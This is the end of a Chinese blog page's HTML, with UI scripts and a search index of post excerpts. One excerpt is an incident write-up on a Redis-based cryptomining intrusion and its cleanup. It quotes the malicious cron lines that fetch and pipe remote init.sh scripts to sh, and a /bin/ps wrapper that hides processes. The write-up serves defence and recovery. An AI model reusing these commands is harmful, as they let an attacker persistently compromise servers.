      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY)
      } else {
        window.scrollTo(_currentY, targetY)
      }
    }, 1)
  }

  back2Top.addEventListener("click", function (e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });

  window.addEventListener('scroll', function (e) {
    let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
    if (percent > 1 && !back2Top.classList.contains('back-top-active')) {
      back2Top.classList.add('back-top-active');
    }
    if (percent == 0) {
      back2Top.classList.remove('back-top-active');
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });


  let hasCacu = false;
  window.onresize = function () {
    calcuHeight();
  }

  function calcuHeight() {
    // åŠ¨æ€è°ƒæ•´ç«™ç‚¹æ¦‚è§ˆé«˜åº¦
    if (!hasCacu && back2Top.classList.contains('pisces') || back2Top.classList.contains('gemini')) {
      let sideBar = document.querySelector('.sidebar');
      let navUl = document.querySelector('#site_nav');
      sideBar.style = 'margin-top:' + (navUl.offsetHeight + navUl.offsetTop + 15) + 'px;';
      hasCacu = true;
    }
  }
  calcuHeight();

  let open = false, MOTION_TIME = 300, RIGHT_MOVE_DIS = '320px';

  if (drawerBox) {
    let rightMotions = document.querySelectorAll('.right-motion');
    let right = drawerBox.classList.contains('right');

    let transitionDir = right ? "transition.slideRightIn" : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS
      };
      closeProp = {
        paddingRight: '0px'
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS
      };
      closeProp = {
        paddingLeft: '0px'
      };
    }

    drawerBox.onclick = function () {
      open = !open;
      window.Velocity(rightSideBar, 'stop');
      window.Velocity(viewport, 'stop');
      window.Velocity(rightMotions, 'stop');
      if (open) {
        window.Velocity(rightSideBar, {
          width: RIGHT_MOVE_DIS
        }, {
          duration: MOTION_TIME,
          begin: function () {
            window.Velocity(rightMotions, transitionDir, {});
          }
        })
        window.Velocity(viewport, openProp, {
          duration: MOTION_TIME
        });
      } else {
        window.Velocity(rightSideBar, {
          width: '0px'
        }, {
          duration: MOTION_TIME,
          begin: function () {
            window.Velocity(rightMotions, {
              opacity: 0
            });
          }
        })
        window.Velocity(viewport, closeProp, {
          duration: MOTION_TIME
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle('muse-line');
      }
      drawerBox.classList.toggle(sideBarOpen);
    }
  }

  // é“¾æ¥è·³è½¬
  let newWindow = 'false'
  if (newWindow === 'true') {
    let links = document.querySelectorAll('.post-body a')
    links.forEach(item => {
      if (!item.classList.contains('btn')) {
        item.setAttribute("target", "_blank");
      }
    })
  }

  let faSearch = document.querySelector('#fa_search');
  faSearch.addEventListener('click', function () {
    document.querySelector('#search_mask').style = ''
  })

  // ä»£ç é«˜äº®
  hljs.initHighlightingOnLoad();
  
  // ç¦»å¼€å½“å‰é¡µtitleå˜åŒ–
  var leaveTitle = "";
  if (leaveTitle) {
    document.addEventListener('visibilitychange', function () {
      if (document.visibilityState == 'hidden') {
        normal_title = document.title;
        document.title = leaveTitle;
      } else {
        document.title = normal_title;
      }
    });
  }

</script>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

<script>
  let images = document.querySelectorAll('.section img');
  console.log(images);
  images.forEach(image => {
    var parent = image.parentElement;
    var next = image.nextElementSibling;
    parent.removeChild(image);
    var aelem = document.createElement('a');
    aelem.href = image.src;
    aelem.dataset['fancybox'] = 'images';
    aelem.dataset['rel'] = 'fancybox-button';
    aelem.classList.add('fancybox');
    aelem.appendChild(image);
    parent.insertBefore(aelem, next);
  })
</script>
    <div class="reward-mask" style="display: none;">
  <div class="reward-relative">
    <span class="close" aria-hidden="true">x</span>
    <div class="reward-body">
      <h2>æ„Ÿè°¢æ‚¨çš„æ”¯æŒï¼Œæˆ‘ä¼šç»§ç»­åŠªåŠ›çš„!</h2>
      <div class="reward-img-box">
        <div style="position: relative; width: 140px; height: 140px;">
          
          
          
        </div>
      </div>
      <p class="reward-word">æ‰«ç æ‰“èµï¼Œä½ è¯´å¤šå°‘å°±å¤šå°‘</p>
      <p class="reward-tip">æ‰“å¼€å¾®ä¿¡æ‰«ä¸€æ‰«ï¼Œå³å¯è¿›è¡Œæ‰«ç æ‰“èµå“¦</p>
    </div>
    <div class="bottom">
      
      
    </div>
  </div>
</div>
<style>
  .reward-mask {
    position: fixed;
    z-index: 99999;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    background-color: #00000054;
  }

  .reward-relative {
    position: relative;
    width: 480px;
    text-align: center;
    margin: 0 auto;
    border-radius: 5px;
    background-color: #fff;
    top: 50%;
    margin-top: -205px;
  }

  .reward-relative .close {
    position: absolute;
    right: 10px;
    font-weight: normal;
    font-size: 16px;
    color: #929292;
  }

  .reward-body {
    padding: 40px 20px 20px;
  }

  .bottom {
    display: flex;
  }

  .reward-btn {
    text-align: center;
  }

  .reward-btn-text {
    display: inline-block;
    cursor: pointer;
    width: 60px;
    height: 60px;
    line-height: 60px;
    border-radius: 50%;
    background-color: #ff9734;
    color: #FFF;
    margin-top: 20px;
  }

  .pay-text {
    margin-top: 10px;
    padding: 10px;
    flex: 1;
    transition: all .2s linear;
  }

  .pay-text:hover {
    background-color: #a5a5a536;
  }

  .reward-body h2 {
    padding-top: 10px;
    text-align: center;
    color: #a3a3a3;
    font-size: 16px;
    font-weight: normal;
    margin: 0 0 20px;
  }

  .reward-body h2:after,
  .reward-body h2:before {
    font-family: Arial, Helvetica, sans-serif;
    background: 0 0;
    width: 0;
    height: 0;
    font-style: normal;
    color: #eee;
    font-size: 80px;
    position: absolute;
    top: 20px;
  }

  .reward-body h2:before {
    content: '\201c';
    left: 50px;
  }

  .reward-body h2:after {
    content: '\201d';
    right: 80px;
  }

  .reward-img-box {
    display: inline-block;
    padding: 10px;
    border: 6px solid #ea5f00;
    margin: 0 auto;
    border-radius: 3px;
    position: relative;
  }

  .reward-img {
    position: absolute;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
  }

  @media (max-width: 767px) {
    .reward-relative {
      height: 100%;
      top: 0px;
      margin-top: 0;
      width: auto;
    }

    .reward-relative .bottom {
      flex-direction: column;
    }

    .reward-relative .pay-text {
      width: 80%;
      margin: 5px auto;
      border: 1px solid silver;
      padding: 6px;
      border-radius: 4px;
    }

    .reward-body h2:after {
      right: 40px;
    }

    .reward-body h2:after,
    .reward-body h2:before {
      font-size: 60px;
    }

    .reward-body h2:before {
      left: 20px;
    }
  }
</style>
<script>
  !function () {
    var mask = document.querySelector('.reward-mask');
    let close = document.querySelector('.reward-relative .close');
    let rewardBtn = document.querySelector('.reward-btn');

    let zfb = document.querySelector('#zfb'),
      wx = document.querySelector('#wx'),
      zfbBtn = document.querySelector('#zfbBtn'),
      wxBtn = document.querySelector('#wxBtn');

    if (zfbBtn && wxBtn) {
      zfbBtn.addEventListener('click', () => {
        window.Velocity(zfb, 'transition.slideLeftIn', {
          duration: 400
        });
        window.Velocity(wx, 'transition.slideRightOut', {
          display: 'none',
          duration: 400
        });
      });

      wxBtn.addEventListener('click', () => {
        window.Velocity(wx, 'transition.slideRightIn', {
          duration: 400
        });
        window.Velocity(zfb, 'transition.slideLeftOut', {
          display: 'none',
          duration: 400
        });
      });
    }

    rewardBtn.addEventListener('click', (e) => {
      window.Velocity(mask, 'transition.slideDownIn', {
        duration: 400
      })
    });

    close.addEventListener('click', (e) => {
      e.preventDefault();
      window.Velocity(mask, 'transition.slideUpOut', {
        duration: 400
      })
    })
  }()
</script>

  </div>
</body>

<div class="search-mask" id="search_mask" style="display: none;">
  <div class="search-box">
    <div class="search-title">
      <i class="fa fa-search"></i>
      <div class="input-box">
        <input id="search" type="text" class="language" data-lan="search" placeholder="æœç´¢">
      </div>
      <i id="close" class="fa fa-times-circle"></i>
    </div>
    <div class="stat-box">
      <span id="stat_count">0</span><span class="language" data-lan="stat">æ¡ç›¸å…³æ¡ç›®ï¼Œä½¿ç”¨äº†</span><span id="stat_times">0</span><span class="language" data-lan="stat-time">æ¯«ç§’</span>
      <hr>
    </div>
    <div class="result" id="result">
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://amendge.github.io/post/shi-jian-fu-wu-qi-bei-wa-kuang-zhi-hou-de-chu-li/"" data-c="
          &lt;p&gt;å½“ä½ çš„æœåŠ¡å™¨è¢«æŒ–çŸ¿çš„æ—¶å€™ä½ åº”è¯¥æ€ä¹ˆåŠï¼Ÿæˆ–è€…ä½ åº”è¯¥åšä¸€äº›ä»€ä¹ˆï¼Ÿ&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id=&#34;èƒŒæ™¯&#34;&gt;èƒŒæ™¯:&lt;/h2&gt;
&lt;p&gt;åœ¨æ¸…æ˜èŠ‚å‰åä¸¤å°ï¼Œçº¿ä¸ŠæŸä¸ªç§æœ‰é›†ç¾¤å‡ºç°çš„CPUä½¿ç”¨ç‡å‰§å¢å‘Šè­¦ï¼Œå› ä¸ºæ˜¯ä¸šåŠ¡æœåŠ¡å™¨ï¼Œè‡ªèº«çš„é«˜å¯ç”¨å’ŒæœåŠ¡æ¼‚ç§»æœºåˆ¶ä¹Ÿå°±æ²¡æœ‰å¼•èµ·æˆ‘çš„é‡è§†ã€‚ç­‰åˆ°èŠ‚æ—¥è¿‡å®Œä¹‹åæ¥æ‰å¼€å§‹å¤„ç†&lt;/p&gt;
&lt;h1 id=&#34;è¿‡ç¨‹&#34;&gt;è¿‡ç¨‹&lt;/h1&gt;
&lt;h2 id=&#34;å‘Šè­¦&#34;&gt;å‘Šè­¦:&lt;/h2&gt;
&lt;p&gt;é¦–å…ˆæ”¶åˆ°çš„æ˜¯CPUå ç”¨è¶…90%çš„å‘Šè­¦ï¼Œè€Œä¸”85%ä»¥ä¸Šçš„å ç”¨æ˜¯usrçº§åˆ«ï¼Œå½“å‰ç¬¬ä¸€ååº”å°±æ˜¯è¦ä¹ˆæœ‰ä¸œè¥¿å‡æ­»äº†ï¼Œè¦ä¹ˆå°±æ˜¯è°åœ¨ä¹±èµ·ä»€ä¹ˆä¸œè¥¿&lt;/p&gt;
&lt;h2 id=&#34;æ’æŸ¥&#34;&gt;æ’æŸ¥&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;åŸºæœ¬ä¸Šæœºå™¨å·²ç»æ— æ³•è¿›å…¥äº†ï¼Œæ²¡åŠæ³•åªèƒ½é€šè¿‡IPMIè¿›è¡Œé‡å¯,ä½†æ˜¯é‡å¯è¿‡åä»ç›‘æ§è§‚å¯Ÿï¼ŒCPUç«‹é©¬å½ªä¸Šæ¥,åˆæ­¥æ€€ç–‘è¢«æŒ–çŸ¿äº†ã€‚&lt;/li&gt;
&lt;li&gt;é€šè¿‡topå‘½ä»¤å‘ç°æ²¡æœ‰CPUå ç”¨è¿‡é«˜çš„æœåŠ¡ï¼Œå¹¶ä¸”CPUå ç”¨æ€»è®¡ä¸è¶…è¿‡10æ ¸ï¼Œä½†æ˜¯ä»ç›‘æ§çœ‹CPUå ç”¨è¶…40æ ¸,çŒœæµ‹å¯èƒ½è¢«æŒ–çŸ¿äº†ã€‚&lt;/li&gt;
&lt;li&gt;ç®€å•æŸ¥çœ‹äº†ä¸€ä¸‹crontabå‘ç°ç¡®å®å¤šäº†å¾ˆå¤šæ— å…³çš„ä»»åŠ¡&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;REDIS0009ï¿½      redis-ver5.0.5ï¿½
redis-bitsï¿½@ï¿½ctimeï¿½k7h`used-memï¿½prï¿½ï¿½
                                      aof-preambleï¿½ï¿½ï¿½backup4@L


*/5 * * * * root wd1 -q -O- http://45.133.203.192/cleanfda/init.sh | sh

backup1@I


*/2 * * * * root cd1 -fsSL http://195.58.39.46/cleanfda/init.sh | sh

backup3@L


*/4 * * * * root curl -fsSL http://45.133.203.192/cleanfda/init.sh | sh

backup2@K


*/3 * * * * root wget -q -O- http://195.58.39.46/cleanfda/init.sh | sh

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;çœ‹äº†å®šæ—¶ä»»åŠ¡é‡Œé¢çš„è„šæœ¬ï¼Œä¸»è¦çš„ä¿®æ”¹ç‚¹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;crontabä»»åŠ¡&lt;/li&gt;
&lt;li&gt;æœ¬åœ°hosts&lt;/li&gt;
&lt;li&gt;å¤šå¤‡ä»½å¯åŠ¨ä»»åŠ¡&lt;/li&gt;
&lt;li&gt;é‡å‘½ååŸå§‹å‘½ä»¤(ps,curl,wget)&lt;/li&gt;
&lt;li&gt;æ›´æ”¹éƒ¨åˆ†æ–‡ä»¶è¯»å†™æ ¼å¼&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;é‡å‘½åç¤ºä¾‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    then
        echo &amp;quot;/bin/ps changed&amp;quot;
    else
        mv /bin/ps /bin/ps.original
        echo &amp;quot;#! /bin/bash&amp;quot;&amp;gt;&amp;gt;/bin/ps
        echo &amp;quot;ps.original \$@ | grep -v \&amp;quot;zzh\|pnscan\&amp;quot;&amp;quot;&amp;gt;&amp;gt;/bin/ps
        chmod +x /bin/ps
    touch -d 20160825 /bin/ps
        echo &amp;quot;/bin/ps changing&amp;quot;
    fi
å¦‚ä½•æ¢å¤?
echo &amp;quot;ps.original \$@&amp;quot;&amp;gt;&amp;gt;/bin/ps
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ³¨æ„:å¾ˆå¤šé‡å‘½åçš„å‘½ä»¤æ˜¯ä¸ºäº†è®©ä½ æ²¡åŠæ³•æŸ¥çœ‹ä»–æ­£åœ¨è¿è¡Œçš„ç¨‹åºï¼Œå°±æ— æ³•æ€æ‰ã€‚è¿˜æœ‰ä¸€äº›ä¾‹å¦‚ä¸‹è½½ï¼Œé‡å‘½ååæŒ‰ç…§ä»–è„šæœ¬å‘½ä»¤è¿›è¡Œä¸‹è½½è¿è¡Œï¼ŒæŒç»­é¡½å›ºè¿è¡Œ&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥é‡åˆ°æ­¤ç±»çš„æŒ–çŸ¿ï¼Œå¯¹äºç³»ç»Ÿçš„ç ´åæ€§ä¸å¤§ï¼Œä½†æ˜¯è¾ƒä¸ºé¡½å›ºçš„ï¼Œå¯ä»¥å°†æŒ–çŸ¿è¿è¡Œè„šæœ¬è¿›è¡Œä¸‹è½½ä¸‹æ¥ï¼Œæ ¹æ®è„šæœ¬æ­¥éª¤è¿›è¡Œåå‘æ“ä½œå°±å¯ä»¥ï¼Œä½†æ˜¯è¦æ³¨æ„å…ˆåé¡ºåºï¼Œæœ€å¥½çš„æ–¹å¼æ˜¯å…ˆæ–­ç½‘ï¼Œå†æŠŠå®šæ—¶ä»»åŠ¡ç¡®è®¤å…¨éƒ¨å…³é—­åï¼Œå†è¿›è¡Œä¸€å®šçš„å‘½ä»¤ï¼Œhostsç­‰æ¢å¤&lt;/p&gt;
&lt;h1 id=&#34;æ¼æ´æ¥æº&#34;&gt;æ¼æ´æ¥æº&lt;/h1&gt;
&lt;p&gt;æ¥æºäºæœªåŠ å¯†çš„rediså¯ä»¥è¿œç¨‹ä½¿ç”¨config setï¼Œè¿›è€Œæ›´æ”¹crontabåˆ—è¡¨è¿›è¡Œä»»åŠ¡çš„ä¸‹å‘å’Œå¯åŠ¨ã€‚&lt;/p&gt;
&lt;p&gt;ğŸ‘‡ğŸ‘‡ä¼ é€é—¨ğŸ‘‡ğŸ‘‡&lt;br&gt;
&lt;a href=&#34;https://xz.aliyun.com/t/256&#34;&gt;æ¼æ´æ€»ç»“æ–‡ç« &lt;/a&gt;&lt;/p&gt;
">ã€å®è·µã€‘æœåŠ¡å™¨è¢«æŒ–çŸ¿ä¹‹åçš„å¤„ç†</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://amendge.github.io/post/shi-jian-ji-yu-prometheus-han-shu-de-dong-tai-gao-jing-gui-ze/"" data-c="
          &lt;p&gt;å¯¹äºç›‘æ§æ¥è¯´ï¼Œå‘Šè­¦è§„åˆ™æ˜¯å‘Šè­¦æ£€æµ‹å‘å‡ºçš„åŸºæœ¬ï¼Œå½“å‰å¸‚é¢ä¸Šå‡ ä¹æ‰€æœ‰çš„å¼€æºå‘Šè­¦è½¯ä»¶æä¾›çš„è§„åˆ™åŸºæœ¬ä¸Šéƒ½æ˜¯é™æ€å‘Šè­¦è§„åˆ™æˆ–è€…èŒƒå›´å‘Šè­¦&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h1 id=&#34;å…ˆçœ‹ä¸‹å®˜æ–¹æ–‡æ¡£&#34;&gt;å…ˆçœ‹ä¸‹å®˜æ–¹æ–‡æ¡£&lt;/h1&gt;
&lt;h2 id=&#34;å®˜æ–¹å‡½æ•°è‹±æ–‡æ³¨é‡Š&#34;&gt;å®˜æ–¹å‡½æ•°è‹±æ–‡æ³¨é‡Š&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;Holt-Winters is similar to a weighted moving average, where historical data has exponentially less influence on the current data.
Holt-Winter also accounts for trends in data. The smoothing factor (0 &amp;lt; sf &amp;lt; 1) affects how historical data will affect the current data. A lower smoothing factor increases the influence of historical data. The trend factor (0 &amp;lt; tf &amp;lt; 1) affects
how trends in historical data will affect the current data. A higher trend factor increases the influence.
of trends. Algorithm taken from https://en.wikipedia.org/wiki/Exponential_smoothing titled: &amp;quot;Double exponential smoothing&amp;quot;.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸­æ–‡æ³¨é‡Šï¼š&lt;br&gt;
Holt-Wintersç±»ä¼¼äºåŠ æƒç§»åŠ¨å¹³å‡ï¼Œå…¶ä¸­å†å²æ•°æ®å¯¹å½“å‰æ•°æ®çš„å½±å“å‘ˆæŒ‡æ•°çº§å‡å°ã€‚&lt;br&gt;
Holt-Wintersä¹Ÿè§£é‡Šäº†æ•°æ®çš„è¶‹åŠ¿ã€‚å¹³æ»‘å› å­(0 &amp;lt; sf &amp;lt; 1)å½±å“å†å²æ•°æ®å¯¹ç”µæµçš„å½±å“&lt;br&gt;
æ•°æ®ã€‚å¹³æ»‘å› å­è¶Šä½ï¼Œå†å²æ•°æ®çš„å½±å“è¶Šå¤§ã€‚è¶‹åŠ¿å› å­(0 &amp;lt; tf &amp;lt; 1)å½±å“&lt;br&gt;
å†å²æ•°æ®çš„è¶‹åŠ¿å°†å¦‚ä½•å½±å“å½“å‰æ•°æ®ã€‚è¶‹åŠ¿å› å­è¶Šé«˜ï¼Œå½±å“è¶Šå¤§çš„è¶‹åŠ¿ã€‚ç®—æ³•å–è‡ªhttps://en.wikipedia.org/wiki/Exponential_smoothingæ ‡é¢˜:â€œåŒæŒ‡æ•°å¹³æ»‘â€&lt;/p&gt;
&lt;h2 id=&#34;å®˜æ–¹å‡½æ•°ä»£ç &#34;&gt;å®˜æ–¹å‡½æ•°ä»£ç &lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;func funcHoltWinters(vals []parser.Value, args parser.Expressions, enh *EvalNodeHelper) Vector {
	samples := vals[0].(Matrix)[0]

	// The smoothing factor argument.
	sf := vals[1].(Vector)[0].V

	// The trend factor argument.
	tf := vals[2].(Vector)[0].V

	// Sanity check the input.
	if sf &amp;lt;= 0 || sf &amp;gt;= 1 {
		panic(errors.Errorf(&amp;quot;invalid smoothing factor. Expected: 0 &amp;lt; sf &amp;lt; 1, got: %f&amp;quot;, sf))
	}
	if tf &amp;lt;= 0 || tf &amp;gt;= 1 {
		panic(errors.Errorf(&amp;quot;invalid trend factor. Expected: 0 &amp;lt; tf &amp;lt; 1, got: %f&amp;quot;, tf))
	}

	l := len(samples.Points)

	// Can&#39;t do the smoothing operation with less than two points.
	if l &amp;lt; 2 {
		return enh.Out
	}

	var s0, s1, b float64
	// Set initial values.
	s1 = samples.Points[0].V
	b = samples.Points[1].V - samples.Points[0].V

	// Run the smoothing operation.
	var x, y float64
	for i := 1; i &amp;lt; l; i++ {

		// Scale the raw value against the smoothing factor.
		x = sf * samples.Points[i].V

		// Scale the last smoothed value with the trend at this point.
		b = calcTrendValue(i-1, tf, s0, s1, b)
		y = (1 - sf) * (s1 + b)

		s0, s1 = s1, x+y
	}

	return append(enh.Out, Sample{
		Point: Point{V: s1},
	})
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;calctrendvalueæ³¨é‡Š&#34;&gt;calcTrendValueæ³¨é‡Š&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt; Calculate the trend value at the given index i in raw data d.
This is somewhat analogous to the slope of the trend at the given index.
The argument &amp;quot;tf&amp;quot; is the trend factor.
The argument &amp;quot;s0&amp;quot; is the computed smoothed value.
The argument &amp;quot;s1&amp;quot; is the computed trend factor.
The argument &amp;quot;b&amp;quot; is the raw input value.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸­æ–‡æ³¨é‡Šï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è®¡ç®—åŸå§‹æ•°æ®dä¸­ç»™å®šç´¢å¼•iå¤„çš„è¶‹åŠ¿å€¼ã€‚&lt;/li&gt;
&lt;li&gt;è¿™æœ‰ç‚¹ç±»ä¼¼äºç»™å®šæŒ‡æ•°å¤„è¶‹åŠ¿çš„æ–œç‡ã€‚&lt;/li&gt;
&lt;li&gt;å‚æ•°â€œtfâ€æ˜¯è¶‹åŠ¿å› å­ã€‚&lt;/li&gt;
&lt;li&gt;å‚æ•°&amp;quot;s0&amp;quot;æ˜¯è®¡ç®—å¾—åˆ°çš„å¹³æ»‘å€¼ã€‚&lt;/li&gt;
&lt;li&gt;å‚æ•°&amp;quot;s1&amp;quot;æ˜¯è®¡ç®—å‡ºæ¥çš„è¶‹åŠ¿å› å­ã€‚&lt;/li&gt;
&lt;li&gt;å‚æ•°â€œbâ€æ˜¯åŸå§‹è¾“å…¥å€¼ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;calctrendvalueä»£ç &#34;&gt;calcTrendValueä»£ç &lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;func calcTrendValue(i int, tf, s0, s1, b float64) float64 {
	if i == 0 {
		return b
	}
	x := tf * (s1 - s0)
	y := (1 - tf) * b
	return x + y
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ä»£ç è§‚åæ„Ÿ&#34;&gt;ä»£ç è§‚åæ„Ÿ&lt;/h2&gt;
&lt;p&gt;å¯¹äºæˆ‘æ¥è¯´è¿™ä¸ªä»£ç çœ‹çš„å¤§æ¦‚å°±æ˜¯ä¸€ä¸ªç®—æ³•çš„æ€è·¯ï¼Œå¦‚ä½•åŸºäºå½“å‰ç»™å®šçš„åºåˆ—å€¼,å†æ ¹æ®å¹³æ»‘å› å­ã€å†å²æ•°æ®æ¯”é‡å»ç®—ä¸€ä¸ªè¶‹åŠ¿å€¼&lt;/p&gt;
&lt;h1 id=&#34;å®è·µ&#34;&gt;å®è·µ&lt;/h1&gt;
&lt;h2 id=&#34;åŸºäºç½‘ç»œæµé‡åšçªå¢çªé™å¼‚å¸¸æ£€æµ‹&#34;&gt;åŸºäºç½‘ç»œæµé‡åšçªå¢çªé™å¼‚å¸¸æ£€æµ‹&lt;/h2&gt;
&lt;p&gt;æ ¹æ®æœºå™¨å…¥å£æµé‡åšå¼‚å¸¸çªå¢çªé™å‘Šè­¦,å› ä¸ºæµé‡å¯¹äºç°ç½‘æ¥è¯´æ˜¯ä¸€ä¸ªå‘¨æœŸæ€§å˜åŒ–çš„å€¼ï¼Œæ ¹æ®ç°ç½‘è¯·æ±‚æ•°æ®çš„ç¨³å®šæ€§ï¼Œåœ¨ä¸€å®šçš„æ—¶é—´å†…æµé‡æ—¶è¶‹äºä¸€å®šè§„å¾‹è¿›è¡Œä¸‹é™å’Œä¸Šå‡ï¼Œå¦‚æœæœ‰å¤§æ¯”ä¾‹çš„ä¸‹é™æˆ–ä¸Šå‡å°±å›æœ‰é—®é¢˜&lt;br&gt;
1.PrometheusæŸ¥è¯¢æµé‡è¯­å¥&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sum(irate(node_network_receive_bytes_total{app=&amp;quot;01&amp;quot;,idc=&amp;quot;bj&amp;quot;,group=&amp;quot;test&amp;quot;,device=~&amp;quot;eth1&amp;quot;}[5m] offset 1m)*8)by(device)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2.Prometheus record offset 5m&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;groups:
- name: instance_net_record_rules
  rules:
  - record: net_offset_5m:node_network_receive:bj_test_01
    expr: sum(irate(node_network_receive_bytes_total{app=&amp;quot;01&amp;quot;,idc=&amp;quot;bj&amp;quot;,group=&amp;quot;test&amp;quot;,device=~&amp;quot;eth1&amp;quot;}[1m] offset 5m)*8)by(device)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ­£å¼çš„å‘Šè­¦è§„åˆ™&lt;br&gt;
ä¸­æ–‡æ³¨é‡Š:app=&amp;quot;01&amp;quot;,idc=&amp;quot;bj&amp;quot;,group=&amp;quot;test&amp;quot;çš„æœºå™¨eth1ç½‘å¡å…¥å£æµé‡å’Œäº”åˆ†é’Ÿå‰æµé‡å¯¹æ¯” æ³¢åŠ¨è¶…30%&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;abs(sum(irate(node_network_receive_bytes_total{app=&amp;quot;01&amp;quot;,idc=&amp;quot;bj&amp;quot;,group=&amp;quot;test&amp;quot;,device=~&amp;quot;eth1&amp;quot;}[1m])*8)by(device) - holt_winters(net_offset_5m:node_network_receive:bj_test_01[1h],0.5,0.8))/1024^2 &amp;gt; holt_winters(net_offset_5m:node_network_receive:bj_test_01[1h],0.5,0.8)*0.3/1024^2 &amp;gt;5
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‹†åˆ†è§£æ:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;absæ˜¯ä¸ºäº†å»æ­£æ•´æ•°&lt;/li&gt;
&lt;li&gt;holt_winters(net_offset_5m:node_network_receive:bj_test_01[1h],0.5,0.8))/1024^2 æ ¹æ®ä¸€åˆ†é’Ÿå‰æ‰€å¾—çš„æ•°æ®è¿›è¡Œå¹³æ»‘æ‹Ÿåˆé™¤å½“å‰å¤§æ¦‚çš„æ•°æ®&lt;/li&gt;
&lt;li&gt;1024^2 æµé‡å•ä½è½¬æ¢&lt;/li&gt;
&lt;li&gt;å¤§äº5 ä¸ºäº†å»é™¤æœ€ä½è°·æ—¶æµé‡è¾ƒä½å‘Šè­¦&lt;br&gt;
4.å¯¹æ¯”&lt;br&gt;
holt_winters(net_offset_5m:node_network_receive:bj_test_01[1h],0.5,0.8)ç­‰åŒäº&lt;br&gt;
sum(irate(node_network_receive_bytes_total{app=&amp;quot;01&amp;quot;,idc=&amp;quot;bj&amp;quot;,group=&amp;quot;test&amp;quot;,device=~&amp;quot;eth1&amp;quot;}[1m])*8)by(device)&lt;br&gt;
æ•ˆæœå›¾:&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617866977845.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
">ã€å®è·µã€‘åŸºäºPrometheuså‡½æ•°çš„åŠ¨æ€å‘Šè­¦è§„åˆ™</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://amendge.github.io/post/jian-kong-gao-jing-ju-he-orgao-jing-zhao-hui-gong-neng-shi-xian/"" data-c="
          &lt;pre&gt;&lt;code&gt;    ç›‘æ§ç³»ç»Ÿå‘å±•çš„è¿‡ç¨‹ä¸­ï¼Œå½“ä½ çš„ç³»ç»Ÿç›‘æ§è§„åˆ™å’Œæ•°æ®æ¯”è¾ƒå®Œå–„çš„æ—¶å€™æˆ–è€…è¦†ç›–é¢æ¯”è¾ƒé«˜çš„æƒ…å†µä¸‹ï¼Œåœ¨å‘ç”Ÿé—®é¢˜æ—¶å°±ä¼šäº§ç”Ÿå¤§é‡çš„å‘Šè­¦ä¿¡æ¯æˆ–è€…æŒç»­çš„å‘Šè­¦ï¼Œåœ¨å‘Šè­¦çš„æŒç»­é˜¶æ®µä»ä½-ä¸­-é«˜å’Œç›¸å…³çš„å‘Šè­¦éƒ½ä¼šå‡ºç°å¤šæ¬¡ã€‚æ‰€ä»¥åœ¨å‘Šè­¦å‘ç”Ÿæ—¶å¯¹äºå…³é”®ä¿¡æ¯çš„æå–å°¤ä¸ºå…³é”®
&lt;/code&gt;&lt;/pre&gt;
&lt;!-- more --&gt;
&lt;h1 id=&#34;é’ˆå¯¹åº”ç”¨å‘Šè­¦&#34;&gt;é’ˆå¯¹åº”ç”¨å‘Šè­¦:&lt;/h1&gt;
